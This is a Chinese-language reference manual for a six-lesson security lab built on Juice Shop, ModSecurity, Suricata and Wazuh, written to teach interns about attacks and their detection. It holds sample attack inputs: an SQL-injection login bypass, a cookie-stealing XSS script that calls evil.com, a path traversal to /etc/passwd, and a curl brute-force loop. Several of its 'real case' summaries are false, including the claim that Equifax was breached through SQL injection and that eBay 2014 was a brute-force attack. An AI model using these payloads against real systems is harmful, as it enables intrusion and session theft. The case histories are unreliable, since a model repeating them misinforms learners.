# Security Lab — 组件与概念参考手册

> 本手册为 Security Lab 六节课中涉及的所有安全软件组件和攻击/防御概念提供集中参考。适合实习生在实验前预习、实验中查阅、实验后复习。

---

## 目录

1. [安全软件组件](#一安全软件组件)
   - [OWASP Juice Shop](#1-owasp-juice-shop)
   - [Nginx + ModSecurity (WAF)](#2-nginx--modsecurity-waf)
   - [OWASP CRS](#3-owasp-crs)
   - [Suricata (NIDS)](#4-suricata-nids)
   - [Wazuh Agent (HIDS)](#5-wazuh-agent-hids)
   - [Wazuh Manager (SIEM)](#6-wazuh-manager-siem)
   - [Wazuh Dashboard](#7-wazuh-dashboard)
   - [OpenSearch (Wazuh Indexer)](#8-opensearch-wazuh-indexer)
   - [Docker & Docker Compose](#9-docker--docker-compose)
2. [攻击概念](#二攻击概念)
   - [SQL 注入 (SQL Injection)](#1-sql-注入-sql-injection)
   - [跨站脚本 (XSS)](#2-跨站脚本-xss)
   - [目录遍历 (Path Traversal)](#3-目录遍历-path-traversal)
   - [端口扫描 (Port Scanning)](#4-端口扫描-port-scanning)
   - [暴力破解 (Brute Force)](#5-暴力破解-brute-force)
   - [文件篡改 (File Tampering)](#6-文件篡改-file-tampering)
   - [攻击面与攻击链](#7-攻击面与攻击链)
3. [防御概念](#三防御概念)
   - [纵深防御 (Defense in Depth)](#1-纵深防御-defense-in-depth)
   - [WAF：检测模式 vs 拦截模式](#2-waf检测模式-vs-拦截模式)
   - [NIDS vs HIDS](#3-nids-vs-hids)
   - [SIEM 关联分析](#4-siem-关联分析)
   - [文件完整性监控 (FIM)](#5-文件完整性监控-fim)
   - [Decoder + Rule 处理流水线](#6-decoder--rule-处理流水线)
4. [完整安全链路速查](#四完整安全链路速查)

---

## 一、安全软件组件

### 1. OWASP Juice Shop

| 项目 | 内容 |
|------|------|
| **类型** | 漏洞 Web 应用（靶场） |
| **技术栈** | Node.js / Express / SQLite |
| **默认端口** | 3000 |
| **用途** | 模拟真实业务应用，内置 SQL 注入、XSS、JWT 漏洞等多种安全隐患 |
| **课程** | Lesson 01-06 |

**是什么：** OWASP Juice Shop 是 OWASP 官方维护的漏洞 Web 应用，专门用于安全教学和 CTF 比赛。它模拟了一个在线商店，但刻意包含了大量真实世界中常见的安全漏洞。

**内置漏洞包括：**
- SQL 注入（搜索框、登录表单）
- 跨站脚本 XSS（评论、用户输入）
- 不安全的直接对象引用（IDOR）
- JWT 令牌操纵
- 敏感信息泄露（备份文件、.git 目录）
- 不安全的反序列化

**在本实验中的角色：** 被保护的"业务应用"。它代表企业对外暴露的 Web 服务——如果没有防护层，攻击者可以直接利用其中的漏洞。

---

### 2. Nginx + ModSecurity (WAF)

| 项目 | 内容 |
|------|------|
| **类型** | Web 应用防火墙 (WAF) |
| **技术栈** | Nginx（反向代理） + ModSecurity（检测引擎） |
| **默认端口** | 80（HTTP） |
| **用途** | 检测并拦截恶意 HTTP 请求（SQL 注入、XSS、目录遍历等） |
| **课程** | Lesson 02-06 |

**是什么：** WAF（Web Application Firewall）工作在 OSI 第 7 层（应用层），专门检测 HTTP/HTTPS 流量中的恶意请求。

**工作原理：**
```
攻击者请求 → Nginx 接收 → ModSecurity 检测 → 匹配规则？
  ├── 是 → 返回 403 Forbidden，记录审计日志
  └── 否 → 转发到后端 Juice Shop
```

**Nginx 的角色：** 反向代理服务器。所有流量先到达 Nginx，Nginx 将请求交给 ModSecurity 模块检测后再决定是否转发给后端。

**ModSecurity 的角色：** 开源 WAF 检测引擎。它根据规则集逐条检查 HTTP 请求的 URL、参数、Header、Body 等，识别攻击模式。

**两种运行模式：**
- **检测模式（Detection Only）：** 只记录告警，不拦截请求。用于测试阶段观察误报率。
- **拦截模式（Prevention/Blocking）：** 匹配到恶意请求时直接返回 403，阻断攻击。

**学生需要理解：** WAF 不是万能盾牌。它只能检测已知的 HTTP 攻击模式，对网络层攻击（端口扫描、DDoS）、0-day 漏洞、以及绕过规则的新攻击无能为力。

---

### 3. OWASP CRS

| 项目 | 内容 |
|------|------|
| **全称** | OWASP Core Rule Set |
| **类型** | WAF 规则集 |
| **维护方** | OWASP 社区 |
| **用途** | 为 ModSecurity 提供数千条预定义的检测规则 |

**是什么：** CRS 是一套开源的 WAF 规则集，包含了识别常见 Web 攻击所需的大量规则。它是 ModSecurity 的"知识来源"——告诉 ModSecurity 什么请求看起来像攻击。

**规则覆盖的攻击类型：**
- SQL Injection（SQL 注入）
- Cross-Site Scripting（XSS）
- Local/Remote File Inclusion（文件包含）
- Remote Code Execution（远程代码执行）
- HTTP Protocol Violations（协议违规）
- Trojan Detection（木马检测）

**规则等级（Paranoia Level）：** CRS 分为多个安全等级。等级越高，检测越严格，但误报率也越高。生产环境通常从 PL1 开始。

---

### 4. Suricata (NIDS)

| 项目 | 内容 |
|------|------|
| **类型** | 网络入侵检测系统 (NIDS/IDS) |
| **技术栈** | C（高性能，支持多线程） |
| **日志格式** | EVE JSON（结构化日志） |
| **默认规则集** | Emerging Threats (ET) |
| **用途** | 检测网络层威胁：端口扫描、网络攻击特征、协议异常 |
| **课程** | Lesson 03-06 |

**是什么：** Suricata 工作在 OSI 第 3-4 层（网络层/传输层），监控所有经过网络接口的原始流量——不仅仅是 HTTP。

**核心能力：**
- **端口扫描检测：** 短时间内对同一主机多个端口的连接尝试被识别为扫描行为
- **协议异常检测：** 不符合协议规范的流量
- **已知攻击特征匹配：** 基于 ET 规则集匹配网络层攻击
- **流量分析：** 识别异常流量模式（大文件传输、可疑连接）

**EVE JSON 日志：** Suricata 的结构化日志输出，每条记录包含：
- 时间戳（timestamp）
- 源/目标 IP（src_ip, dest_ip）
- 源/目标端口（src_port, dest_port）
- 告警信息（alert: {signature, severity, category}）
- 规则 ID（rule_id）

**macOS 注意：** Suricata 的流量捕获（PCAP）功能在 Linux 上完整支持，macOS 上可能有限制。

---

### 5. Wazuh Agent (HIDS)

| 项目 | 内容 |
|------|------|
| **类型** | 主机入侵检测系统 (HIDS) 代理 |
| **版本** | 4.9.0 |
| **部署位置** | 每台受监控的主机/容器 |
| **用途** | 监控主机内部：文件变化、可疑进程、系统日志、Rootkit |
| **课程** | Lesson 04-06 |

**是什么：** Wazuh Agent 是安装在受监控主机上的轻量级代理。它是你在主机层的"眼睛"——从内部监控系统状态。

**核心功能：**
- **文件完整性监控 (FIM)：** 监控关键文件的创建、修改、删除、权限变化
- **日志监控：** 收集和分析系统日志（auth.log, syslog, journal 等）
- **进程监控：** 检测可疑进程
- **Rootkit 检测：** 扫描系统中可能存在的 Rootkit
- **系统配置评估：** 检查安全配置合规性

**与 NIDS 的区别：**
| 维度 | NIDS (Suricata) | HIDS (Wazuh Agent) |
|------|----------------|-------------------|
| 视角 | 外部，看流量 | 内部，看系统 |
| 层级 | 网络层 (L3/L4) | 主机层 (OS) |
| 比喻 | 大楼入口的摄像头 | 每个房间里的监控 |
| 能看到 | 端口扫描、协议攻击 | 文件篡改、可疑进程 |
| 看不到 | 主机内部变化 | 网络层侦察 |

---

### 6. Wazuh Manager (SIEM)

| 项目 | 内容 |
|------|------|
| **类型** | 安全信息与事件管理 (SIEM) |
| **版本** | 4.9.0 |
| **用途** | 集中收集、解析、关联、分析所有安全日志，生成告警 |
| **课程** | Lesson 05-06 |

**是什么：** SIEM 是所有安全日志的"大脑"。它把来自 WAF、NIDS、HIDS、应用的分散日志汇聚到一个平台，通过关联规则发现攻击模式。

**处理流水线（Decoder + Rule）：**
```
原始日志文本 → Decoder 解析字段 → Rule 匹配模式 → 生成 Alert
```

- **Decoder：** 把不同格式的原始日志解析成统一的结构化数据。例如，把 Apache 日志、Suricata EVE JSON、Wazuh Agent 消息解析为统一的字段格式。
- **Rule：** 基于解析后的数据匹配攻击模式。例如："同一来源 1 分钟内 50 次失败登录 → 暴力破解告警"。

**关联分析示例：**
| 单个事件 | 关联后的结论 |
|----------|-------------|
| 1 次失败登录 | 正常，无告警 |
| 50 次失败登录/分钟 | 🔴 **暴力破解攻击** |
| WAF 拦截 + NIDS 扫描 + HIDS 文件修改 | 🔴 **完整攻击链：侦察→入侵→植入** |

**为什么需要 SIEM：** 单个安全组件只能看到攻击的一个片段。只有把多个组件的日志放在一起分析，才能看到完整的攻击图景。

---

### 7. Wazuh Dashboard

| 项目 | 内容 |
|------|------|
| **类型** | 安全态势可视化仪表盘 |
| **访问地址** | https://localhost:443 |
| **默认账号** | admin / admin |
| **用途** | 安全事件统计、攻击类型分布、事件时间轴、组件健康监控 |
| **课程** | Lesson 06 |

**主要面板：**

| 面板 | 内容 | 用途 |
|------|------|------|
| Security Overview | 按严重级别统计的事件数 | 快速了解当前安全状态 |
| Attack Types | 攻击类型分布（饼图/柱图） | 识别主要威胁类型 |
| Event Timeline | 安全事件时间轴 | 发现攻击密集时段 |
| Source IPs | 攻击来源 IP 列表 | 追踪攻击者 |
| Component Health | 各安全组件在线状态 | 确认防御体系完整性 |
| Alert Table | 告警详情 | 处理具体安全事件 |

---

### 8. OpenSearch (Wazuh Indexer)

| 项目 | 内容 |
|------|------|
| **类型** | 分布式搜索与分析引擎 |
| **用途** | 存储和索引所有安全事件数据，为 Dashboard 提供查询能力 |
| **课程** | Lesson 06 |

**是什么：** OpenSearch 是 Elasticsearch 的开源分支，提供强大的全文搜索和聚合分析能力。Wazuh 把所有安全事件写入 OpenSearch，Dashboard 通过查询 OpenSearch 来展示数据和图表。

**在架构中的位置：** Wazuh Manager → OpenSearch → Wazuh Dashboard

---

### 9. Docker & Docker Compose

| 项目 | 内容 |
|------|------|
| **类型** | 容器化部署平台 |
| **用途** | 一键启动完整安全实验环境 |

**Docker Network 设计：** 实验使用多个 Docker 网络模拟企业网络分区：

| 网络 | 用途 |
|------|------|
| `dmz-net` | WAF 面向的网络区域 |
| `app-net` | 后端应用网络（通常内部隔离） |
| `monitor-net` | Suricata 监控网络 |
| `hids-net` | Wazuh Agent 网络 |
| `siem-net` | SIEM 内部网络 |
| `dashboard-net` | Dashboard 面向网络 |

**关键命令速查：**
```bash
docker compose up -d        # 启动所有容器
docker compose ps           # 查看容器状态
docker compose logs -f      # 跟随日志
docker compose down         # 停止并移除容器
docker compose exec <svc> bash  # 进入容器
```

---

## 二、攻击概念

### 1. SQL 注入 (SQL Injection)

**严重级别：** 🔴 Critical

**是什么：** 攻击者通过在用户输入中插入恶意 SQL 代码，使后端数据库执行非预期的 SQL 命令。

**原理：** 当应用直接将用户输入拼接到 SQL 语句中时，攻击者可以改变 SQL 逻辑。

**经典示例：**
```
登录表单输入:
  用户名: admin' OR 1=1 --
  密码: (任意)

拼接后的 SQL:
  SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'xxx'
                                         ↑ 永远为真    ↑ 注释掉后面的内容

结果：绕过认证，以 admin 身份登录
```

**搜索框注入示例（本实验）：**
```
搜索参数: ' OR 1=1 --
URL 编码: %27%20OR%201%3D1%20--
效果：返回所有产品数据，而非搜索关键词的匹配结果
```

**可能造成的危害：**
- 绕过身份认证
- 窃取数据库中的敏感信息
- 修改或删除数据
- 在某些情况下执行系统命令

**防御方式：**
- **WAF（本课）：** ModSecurity 的 CRS 规则检测 SQL 关键字模式，返回 403
- **参数化查询（开发层）：** 使用预编译语句，从根本上消除注入
- **输入验证：** 对用户输入进行白名单过滤

**真实案例：** 2017 年 Equifax 数据泄露事件中，攻击者利用 Apache Struts 漏洞注入 SQL，导致 1.47 亿人数据泄露，罚款 7 亿美元。

---

### 2. 跨站脚本 (XSS)

**严重级别：** 🟠 High

**是什么：** 攻击者将恶意 JavaScript 代码注入到网页中，在其他用户的浏览器中执行。

**原理：** 当应用将用户输入未经净化直接输出到 HTML 页面时，`<script>` 标签会被浏览器执行。

**经典示例：**
```
评论框输入:
  <script>document.location='http://evil.com/?cookie='+document.cookie</script>

当其他用户查看此评论时:
  → 浏览器执行恶意脚本
  → 窃取用户的 Session Cookie
  → 攻击者获得该用户的会话控制权
```

**本实验中的测试：**
```
URL 编码: %3Cscript%3Ealert(1)%3C/script%3E
解码后: <script>alert(1)</script>
效果：如果未被拦截，弹出警告框（PoC 级别）
```

**三种 XSS 类型：**
| 类型 | 描述 | 存储位置 |
|------|------|----------|
| 反射型 (Reflected) | 恶意输入通过 URL 参数反射到页面 | 不存储 |
| 存储型 (Stored) | 恶意脚本存储在数据库中，所有查看者都受影响 | 数据库 |
| DOM 型 (DOM-based) | 前端 JS 代码直接操作 DOM 导致执行 | 前端 |

**可能造成的危害：**
- 窃取 Session Cookie（会话劫持）
- 冒充用户执行操作
- 重定向到钓鱼网站
- 键盘记录

**防御方式：**
- **WAF（本课）：** 检测 `<script>`、`javascript:`、`onerror=` 等模式
- **输出编码（开发层）：** 将 `<` 编码为 `&lt;`，使脚本不执行
- **Content Security Policy (CSP)：** 浏览器端限制脚本来源

**真实案例：** 2018 年 British Airways 网站被注入 XSS 脚本，窃取 38 万乘客的支付信息，被罚 2000 万英镑。

---

### 3. 目录遍历 (Path Traversal)

**严重级别：** 🟠 High

**是什么：** 攻击者通过操纵文件路径参数，访问 Web 根目录之外的系统文件。

**经典示例：**
```
请求 URL:
  http://example.com/page?file=../../../etc/passwd

服务器处理:
  拼接路径: /var/www/html/ + ../../../etc/passwd
  解析结果: /etc/passwd  ← 系统文件被读取
```

**本实验中的测试：**
```
请求: GET /../../etc/passwd
目标: 读取 Linux 系统的用户账户文件
```

**可能造成的危害：**
- 读取系统敏感文件（`/etc/passwd`、`/etc/shadow`）
- 读取应用配置文件（数据库凭证）
- 读取源代码

**防御方式：**
- **WAF（本课）：** CRS 规则检测 `../`、`..\\` 等路径遍历模式
- **输入验证：** 拒绝包含 `..` 的请求
- **安全配置：** 限制 Web 服务器只能访问指定目录

---

### 4. 端口扫描 (Port Scanning)

**严重级别：** 🟡 Medium（侦察阶段）

**是什么：** 攻击者向目标主机的多个端口发送连接请求，探测哪些服务正在运行。

**原理：** 每个网络服务都监听一个 TCP/UDP 端口。通过扫描可以知道：
- 哪些端口是开放的（服务在运行）
- 哪些端口是关闭的
- 哪些端口被防火墙过滤

**常见扫描工具：** nmap

**本实验中的扫描：**
```bash
nmap -sT localhost -p 80,3000
# -sT: TCP 连接扫描（最基础的方式）
# -p: 指定扫描的端口
```

**端口与服务对应关系：**
| 端口 | 常见服务 | 风险 |
|------|---------|------|
| 22 | SSH | 远程管理入口 |
| 80 | HTTP | Web 服务 |
| 443 | HTTPS | 加密 Web 服务 |
| 3000 | Node.js | 开发/应用服务 |
| 3306 | MySQL | 数据库（不应暴露） |
| 8080 | Tomcat/代理 | 应用服务器 |

**为什么危险：** 端口扫描本身不造成破坏，但它是攻击的**侦察阶段**。攻击者通过扫描了解你的服务版图，然后针对特定服务发起攻击。

**Suricata 如何检测：** 短时间内对同一主机的多个端口发起连接请求 → 行为模式匹配 → 生成端口扫描告警。

**真实案例：** 2013 年 Target 数据泄露事件。攻击者首先通过端口扫描发现了一个 HVAC 供应商的薄弱入口，然后横向移动进入 Target 核心网络，盗取了 4000 万信用卡数据。

---

### 5. 暴力破解 (Brute Force)

**严重级别：** 🔴 Critical（持续攻击）

**是什么：** 攻击者通过大量尝试不同的用户名/密码组合，试图猜出有效的登录凭证。

**原理：** 如果不对登录失败次数做限制，攻击者可以自动化地发送成千上万次登录请求。

**本实验中的攻击模式：**
```bash
# 快速发送 30+ 次失败登录请求
for i in $(seq 1 60); do
  curl -X POST "http://localhost:80/api/users/login" \
    -d '{"email":"admin@test.com","password":"wrong'$i'"}'
  sleep 0.2
done
```

**暴力破解的类型：**
| 类型 | 描述 | 示例 |
|------|------|------|
| 简单暴力破解 | 尝试所有可能的密码组合 | admin/123456, admin/password... |
| 字典攻击 | 使用常见密码字典 | rockyou.txt 中的密码 |
| 凭证填充 | 使用其他站点泄露的凭证 | 用 LinkedIn 泄露的密码试其他站点 |
| 反向暴力破解 | 固定密码，尝试不同用户名 | password123/admin, password123/root... |

**为什么 SIEM 才能检测：** 单个失败登录请求看起来完全正常——WAF 不会拦截（合法 URL），NIDS 不会告警（正常 TCP 连接）。只有 SIEM 把**时间窗口内的所有失败登录聚合起来**，才能识别出"50 次失败/分钟 = 暴力破解"的模式。

**防御方式：**
- **SIEM 关联规则（本课）：** 时间窗口 + 频率阈值 → 暴力破解告警
- **账户锁定：** 连续 N 次失败后锁定账户
- **验证码 (CAPTCHA)：** 增加自动化攻击成本
- **多因素认证 (MFA)：** 即使密码被猜出，还需要第二因素

**真实案例：** 2014 年 eBay 遭暴力破解攻击，1.45 亿用户数据泄露。事后分析发现：如果当时有 SIEM 做关联分析，攻击本可以在几分钟内被发现。

---

### 6. 文件篡改 (File Tampering)

**严重级别：** 🔴 Critical（已入侵阶段）

**是什么：** 攻击者在获得主机访问权限后，修改系统文件、创建后门、植入恶意代码。

**本实验中的模拟：**
```bash
# 模拟攻击者在容器中创建隐藏后门文件
docker exec juice-shop touch /tmp/.hidden_backdoor
```

**常见的文件篡改行为：**
| 行为 | 目的 |
|------|------|
| 修改 `/etc/passwd` | 创建后门账户 |
| 修改 Web 文件 | 植入 WebShell |
| 删除日志文件 | 销毁攻击痕迹 |
| 修改 cron 任务 | 持久化恶意代码 |
| 安装 Rootkit | 隐藏恶意进程 |

**为什么只有 HIDS 能检测：** WAF 只看 HTTP 流量，NIDS 只看网络流量。文件系统的变化发生在主机内部，只有 HIDS（通过 FIM）能看到。

**防御方式：**
- **HIDS + FIM（本课）：** 实时监控关键目录的文件创建、修改、删除
- **最小权限原则：** 限制哪些用户/进程可以修改关键文件
- **不可变基础设施：** 关键配置只读，不允许运行时修改

**真实案例：** 2016 年 Uber 被攻击后，攻击者修改了内部系统文件。由于没有文件完整性监控，篡改行为长时间未被发现。Uber 支付赎金试图掩盖，最终被罚 1.48 亿美元。

---

### 7. 攻击面与攻击链

**攻击面 (Attack Surface)：** 系统暴露给潜在攻击者的所有入口点的总和。

> 暴露越多 = 风险越大。Lesson 01 中 Juice Shop 直接暴露在端口 3000 上，没有任何防护——这就是最大的攻击面。

**攻击链 (Kill Chain)：** 攻击者从侦察到达成目标的完整步骤：

```
侦察 (Reconnaissance) → 武器化 (Weaponization) → 投递 (Delivery)
     → 利用 (Exploitation) → 安装 (Installation) → 控制 (C2) → 行动 (Actions)
```

**在本实验中：**
| 攻击链阶段 | 对应攻击 | 可被谁检测 |
|-----------|---------|-----------|
| 侦察 | 端口扫描 | NIDS (Suricata) |
| 投递 | SQL 注入、XSS | WAF (ModSecurity) |
| 利用 | SQL 注入成功 | WAF + SIEM |
| 安装 | 文件篡改、后门 | HIDS (Wazuh Agent) |
| 控制 | 暴力破解登录 | SIEM (Wazuh Manager) |
| 全景 | 所有阶段关联 | Dashboard |

---

## 三、防御概念

### 1. 纵深防御 (Defense in Depth)

**核心思想：** 不依赖单一防护层。即使一层被突破，其他层仍然在工作。

**本实验的纵深防御体系：**
```
Layer 1 — WAF (应用层)    → 拦截 SQL 注入、XSS、目录遍历
Layer 2 — NIDS (网络层)   → 检测端口扫描、网络攻击
Layer 3 — HIDS (主机层)   → 监控文件篡改、可疑进程
Layer 4 — SIEM (分析层)   → 关联分析、暴力破解检测
Layer 5 — Dashboard (展示) → 全局态势感知
```

**关键理解：** 每一层都有自己的盲区，但也有自己独到的视角。多层组合 = 完整的威胁可见性。

---

### 2. WAF：检测模式 vs 拦截模式

| 模式 | 行为 | 适用场景 | 风险 |
|------|------|---------|------|
| 检测模式 | 记录告警但不拦截 | 上线初期、验证规则 | 攻击仍然到达后端 |
| 拦截模式 | 匹配即返回 403 | 生产环境、规则成熟 | 可能有误报影响正常用户 |

**经验法则：** 新部署 WAF 时先用检测模式运行 1-2 周，分析误报率后再切换到拦截模式。

---

### 3. NIDS vs HIDS

| 维度 | NIDS | HIDS |
|------|------|------|
| 监控位置 | 网络接口 | 主机系统 |
| 数据来源 | 网络流量包 | 系统日志、文件、进程 |
| 擅长检测 | 端口扫描、协议攻击、已知攻击特征 | 文件篡改、Rootkit、异常进程 |
| 盲区 | 加密流量内容、主机内部活动 | 未安装 Agent 的主机、网络层攻击 |
| 部署方式 | 旁路接入网络 | 每台主机安装 Agent |
| 比喻 | 摄像头看大楼入口 | 监控看每个房间 |

**最佳实践：** 同时部署 NIDS + HIDS，互补而非替代。

---

### 4. SIEM 关联分析

**核心概念：** 单个事件无害，多个事件关联后构成攻击信号。

**关联规则示例：**
```
规则: 同一源 IP 在 5 分钟内失败登录 > 20 次
条件: 时间窗口 = 5 分钟, 阈值 = 20
触发: 暴力破解告警 (Severity: High)

规则: NIDS 端口扫描 + WAF SQL 注入 + HIDS 文件修改
条件: 同一源 IP, 24 小时内, 3 种不同类型的告警
触发: 完整攻击链告警 (Severity: Critical)
```

**为什么这很重要：** 没有关联分析，安全团队面对的是成千上万条独立的低级别告警——无法区分哪些真正重要。关联分析帮团队从"噪声"中提炼出"信号"。

---

### 5. 文件完整性监控 (FIM)

**是什么：** 持续监控关键文件和目录的创建、修改、删除、权限变化。

**典型监控目标：**
- `/etc/passwd`, `/etc/shadow` — 用户账户
- `/etc/crontab` — 定时任务
- Web 根目录 — WebShell 植入
- 系统二进制文件 — Rootkit 替换

**检测逻辑：**
```
基线快照 → 持续对比 → 发现变化 → 生成告警
  (初始)     (运行时)     (差异)      (通知)
```

**FIM 不能做的事：** 阻止文件修改（它只检测和告警）。阻止需要访问控制（ACL）或不可变文件系统。

---

### 6. Decoder + Rule 处理流水线

这是 SIEM 处理日志的核心机制：

```
原始日志: "192.168.1.100 - - [01/Sep/2024] POST /api/users/login 401"
    ↓
[Decoder] 解析字段:
  src_ip = 192.168.1.100
  method = POST
  url = /api/users/login
  status = 401
    ↓
[Rule] 匹配模式:
  IF status == 401 AND url contains "login" THEN ...
  IF count(status==401, src_ip, 5min) > 20 THEN severity = High
    ↓
[Alert] 输出告警:
  {
    "rule": "Brute force detected",
    "severity": "High",
    "src_ip": "192.168.1.100",
    "count": 60
  }
```

---

## 四、完整安全链路速查

### 组件与课程对应关系

| 课程 | 新增组件 | 新增能力 | 防御的攻击 |
|------|---------|---------|-----------|
| Lesson 01 | Juice Shop | 理解攻击面 | —（展示脆弱性） |
| Lesson 02 | Nginx + ModSecurity | Web 应用防火墙 | SQL 注入、XSS、目录遍历 |
| Lesson 03 | Suricata | 网络入侵检测 | 端口扫描、网络攻击 |
| Lesson 04 | Wazuh Agent | 主机入侵检测 | 文件篡改、可疑进程 |
| Lesson 05 | Wazuh Manager | SIEM 关联分析 | 暴力破解、攻击链关联 |
| Lesson 06 | Dashboard + OpenSearch | 端到端可视化 | 全景态势感知 |

### 攻击-防御矩阵

| 攻击 | WAF | NIDS | HIDS | SIEM | Dashboard |
|------|:---:|:----:|:----:|:----:|:---------:|
| SQL 注入 | 🛡️ | | | 📋 | 📊 |
| XSS | 🛡️ | | | 📋 | 📊 |
| 目录遍历 | 🛡️ | | | 📋 | 📊 |
| 端口扫描 | | 🛡️ | | 📋 | 📊 |
| 文件篡改 | | | 🛡️ | 📋 | 📊 |
| 暴力破解 | | | | 🛡️ | 📊 |

> 🛡️ = 直接检测/拦截 &nbsp;&nbsp; 📋 = 记录并聚合 &nbsp;&nbsp; 📊 = 可视化展示

### 数据流向

```
攻击者 → WAF → Juice Shop → 日志 → ┐
                                    │
              网络流量 → Suricata → 日志 → ├→ Wazuh Manager → OpenSearch → Dashboard
                                    │
              主机事件 → Wazuh Agent → 日志 → ┘
```

---

*本手册覆盖 Security Lab 六节课的全部核心概念。建议结合动手实验理解每个概念——理论学习与实践操作的结合是最有效的学习方式。*
